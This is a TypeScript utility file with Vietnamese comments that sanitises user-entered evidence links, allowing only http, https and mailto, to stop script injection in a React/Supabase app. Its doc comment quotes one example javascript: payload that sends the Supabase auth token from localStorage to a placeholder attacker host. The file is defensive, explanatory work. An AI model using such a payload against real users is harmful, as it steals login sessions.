/**
 * Lọc đường dẫn trước khi đưa vào thuộc tính href.
 *
 * React KHÔNG tự lọc href. Trường "bằng chứng đính kèm" (evidence_url) do cán bộ
 * tự gõ tự do, nên nếu render thẳng thì một người có thể lưu
 * `javascript:fetch('https://evil/?t='+localStorage.getItem('sb-...-auth-token'))`
 * — người duyệt bấm vào là mất phiên đăng nhập, vì token Supabase nằm ở localStorage.
 *
 * Chỉ cho qua http/https (và mailto cho tiện liên hệ). Mọi giá trị khác — kể cả
 * `javascript:`, `data:`, `vbscript:` — trả về undefined để nơi gọi hiển thị dạng
 * chữ thường thay vì tạo liên kết bấm được.
 */
const GIAO_THUC_AN_TOAN = new Set(['http:', 'https:', 'mailto:']);

export function safeHref(raw?: string | null): string | undefined {
  const s = (raw ?? '').trim();
  if (!s) return undefined;

  try {
    // base = origin hiện tại để chấp nhận cả đường dẫn tương đối ("/tai-lieu/x.pdf").
    const base = typeof window !== 'undefined' ? window.location.origin : 'https://localhost';
    const u = new URL(s, base);
    return GIAO_THUC_AN_TOAN.has(u.protocol) ? s : undefined;
  } catch {
    // Không phân tích được thành URL (vd cán bộ gõ mô tả ngắn thay vì link).
    return undefined;
  }
}

/** true khi chuỗi là liên kết bấm được an toàn. */
export function laLienKetAnToan(raw?: string | null): boolean {
  return safeHref(raw) !== undefined;
}
